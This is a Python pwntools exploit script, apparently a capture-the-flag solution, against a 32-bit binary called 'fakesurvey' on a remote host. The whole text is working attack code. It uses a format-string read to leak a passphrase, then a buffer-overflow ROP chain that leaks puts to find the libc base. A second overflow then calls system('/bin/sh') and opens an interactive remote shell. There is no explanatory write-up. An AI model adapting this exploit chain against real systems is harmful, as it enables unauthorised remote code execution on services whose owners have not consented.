from pwn import *

context.arch = "i386"

binary = ELF("./fakesurvey")
libc = ELF("libc6-i386_2.31-0ubuntu9.2_amd64.so")

def leak_passphrase():
    p = remote("185.235.41.205",7050)
    p.recv()
    p.sendline(b"%8$llx %9$llx")
    p.recvuntil(b"Your password is ")
    l = p.recv()[:-1].split(b" ")
    p.close()
    password = b""
    for i in l:
        password += p64(int(i,16))
    return password

def leak_libc_base():
    payload = b"A"*76
    payload += p32(binary.plt['puts'])
    payload += p32(binary.symbols['main'])
    payload += p32(binary.got['puts'])
    
    p.recv()
    p.recv()
    p.sendline(passphrase)
    p.recv()
    p.recv()
    p.sendline(payload)
    p.recvuntil(b"***\n")
    leak = u32(p.recv(4))
    log.info("puts libc leaked address : " + hex(leak))
    libc_base = leak - libc.symbols['puts']
    log.info("libc base address : " + hex(libc_base))
    return libc_base

def get_shell(libc_base):
    system = libc_base + libc.symbols['system']
    binsh = libc_base + next(libc.search(b"/bin/sh"))

    payload = b"A"*76
    payload += p32(system)
    payload += b"CCCC"
    payload += p32(binsh)
    p.recv()
    p.sendline(passphrase)
    p.recv()
    p.recv()
    p.send(payload)
    p.interactive()

passphrase = leak_passphrase()
p = remote("185.235.41.205",7050)
libc_leak = leak_libc_base()
get_shell(libc_leak)